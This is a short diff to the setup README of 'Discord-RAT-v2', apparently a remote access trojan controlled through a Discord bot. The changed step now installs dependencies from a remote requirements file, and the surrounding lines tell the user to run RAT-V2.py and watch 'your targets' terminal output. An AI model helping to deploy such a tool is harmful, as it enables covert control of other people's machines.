@@ -52,7 +52,7 @@ You can get your channel id by enabling developer mode in Discord settings, then
 
 4. Save the file and close it
 5. Install the needed libraries:
-```python -m pip install -U Pillow pyperclip discord.py[voice] requests pyautogui python-dotenv``` (`python3` if your on Linux)
+```python -m pip install -r https://raw.githubusercontent.com/simen64/Discord-RAT-v2/main/requirements.txt``` (`python3` if your on Linux)
 6. Run `RAT-V2.py`!
 
 Now if you have access to your targets terminal output of `RAT-V2.py` you should see this when the program has started: `Logged in as: Your bot`
